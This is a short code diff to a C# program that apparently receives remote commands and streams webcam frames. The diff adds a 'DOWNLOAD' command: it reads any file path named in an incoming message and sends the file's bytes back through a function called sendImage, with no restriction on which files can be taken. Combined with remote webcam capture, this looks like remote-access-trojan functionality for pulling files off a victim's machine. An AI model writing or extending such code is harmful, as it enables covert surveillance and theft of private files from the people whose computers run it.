@@ -179,6 +179,11 @@ class Program
                 webcamRunning = false;
                 break;
 
+            case "DOWNLOAD":
+                string filepath = root.GetProperty("filepath").GetString();
+                DownloadFile(from, filepath);
+                break;
+
             default:
                 return;
         }
@@ -414,6 +419,25 @@ class Program
             }
 
             await Task.Delay(100); // ~50 FPS
+        }
+    }
+
+    static async Task DownloadFile(string to, string filePath)
+    {
+        try
+        {
+            if (!File.Exists(filePath))
+            {
+                sendText(to, "download", "File is not exist!");
+                return;
+            }
+
+            byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
+            sendImage(to, fileBytes);
+        }
+        catch (Exception ex)
+        {
+            sendText(to, "download", "Some error occurs!");
         }
     }
 
